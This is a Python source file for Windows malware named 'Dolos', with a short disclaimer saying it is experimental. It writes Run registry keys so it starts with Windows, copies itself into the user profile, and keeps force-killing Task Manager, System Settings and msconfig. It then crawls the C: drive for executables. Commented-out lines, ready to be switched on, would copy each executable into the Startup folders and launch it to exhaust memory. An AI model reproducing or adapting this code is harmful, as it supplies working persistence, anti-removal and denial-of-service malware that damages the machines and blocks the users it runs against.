# Pythogen
# 4/24/2016

# Dolos -

# Experimental purposes. Don't execute unless you know
# what this is.

# Don't execute on anyone else's computer without permission!

import os
import subprocess
import shutil
import requests
from time import sleep
import urllib
import win32gui
from ctypes import *
import sys
from shutil import copyfile
from random import randint

windowTile = ""; 
user32 = windll.user32
kernel32 = windll.kernel32
winTitle = None


# -----------------------
# [ Selectable Routines ]
# -----------------------

def install():
	# Start up name
	SERVICE_NAME = "Fuzz"
	SERVICE_NAME2 = "Fizz"
	# Condition
	if getattr(sys, 'frozen', False):
	    EXECUTABLE_PATH = sys.executable
	elif __file__:
	    EXECUTABLE_PATH = __file__
	else:
	    EXECUTABLE_PATH = ''
	# Exe name
	EXECUTABLE_NAME = os.path.basename(EXECUTABLE_PATH)
	# Reg
	stdin, stdout, stderr = os.popen3("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME, "%USERPROFILE%\\" + EXECUTABLE_NAME))
	shutil.copyfile(EXECUTABLE_PATH, os.path.expanduser("~/%s" % EXECUTABLE_NAME))

	stdin, stdout, stderr = os.popen3("reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /f /v %s /t REG_SZ /d %s" % (SERVICE_NAME2, "%PROGRAMFILES%\\" + EXECUTABLE_NAME))
	shutil.copyfile(EXECUTABLE_PATH, os.path.expanduser("~/%s" % EXECUTABLE_NAME))
	print EXECUTABLE_NAME


def getWindowTitle():
	# Get window in focus
	hwnd = user32.GetForegroundWindow()

	# Extract the window's title
	title = create_string_buffer("\x00" * 512)
	length = user32.GetWindowTextA(hwnd, byref(title),512)
	
	# Display title in console
	print "\n\n[ %s ]\n" % ( title.value)
	
	# Close
	kernel32.CloseHandle(hwnd)


def crawl(dlet):

	# Using specified base dir and os.walk to crawl
	folder = dlet

	# Default StartUp Locations
	startFold1 = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\\'
	startFold2 = 'C:\Documents and Settings\All Users\Start Menu\Programs\StartUp\\'


	for i in range(1,3):
		for (paths, dirs, files) in os.walk(folder):
    			for file in files:
    				if i==1:
    				# Exe gather
        				if file.endswith(".exe"):
        					# sworb contains the randomly generated new file names to be copied.
        					sworb = randint(0,9999)
        					# Real-time view of execution
        					print "\nFile Extracted:"
        					print os.path.join(paths, file)
        					print "\nCopied to:"
        					print os.path.join(paths, ('%s.exe') % str(sworb))
        					print "\nExecuting and adding to startup..\n"

        					# Core (De-highlight Four Lines)
        					
        					# Line 1 (Rapidly Copy exe files > Randomize file names):
        					# copyfile(os.path.join(paths, file), os.path.join(paths, '%s.exe'% str(sworb)))

      						# Line 2 (Copy NEW file to startup):
        					# copyfile(os.path.join(paths, '%s.exe'% str(sworb)), '%s%s.exe' % (startFold1, sworb))
        					
        					# Line 3:
        					# copyfile(os.path.join(paths, '%s.exe'% str(sworb)), '%s%s.exe' % (startFold2, sworb))
        					
        					# Line 4 (Rapidly execute NEWLY copied exe files. (Memory Exhaustion)):
        					# subprocess.Popen( os.path.join(paths, '%s.exe'% str(sworb) ))

      						# Testing purposes (optional):
        					# xsp = raw_input("Debug: Press ENTER to continue...")

      						pass
    					

# -------------------------------
# [ Real-Time Monitor Functions ]
# -------------------------------

def cnter():
	global cnt
	cnt = cnt + 1
	sleep(1)
	print "\n%s\n" % (cnt)


# Disable specific OS features.
def procCTRL():
	global cnt
	global w
	global winTitle
	global windowTile
	global kernel32
	global user32


	# Monitor and Control Processes
	os.system("taskkill /im Taskmgr.exe /f")
	os.system("taskkill /im SystemSettings.exe /f")
	os.system("taskkill /im msconfig.exe /f")


def main():
	# Initialize
	global cnt
	cnt = 0
	
	# Step 1 - Start UP Config
	install()

	# Step 2 - Real-Time Struct
	while(True):
		if cnt < 3:
			# Call Process Control
			procCTRL()
			cnter()

		# Time is up!
		elif cnt == 3:
			
			# Crawl Drive
			crawl('C:\\')

# Activate
main()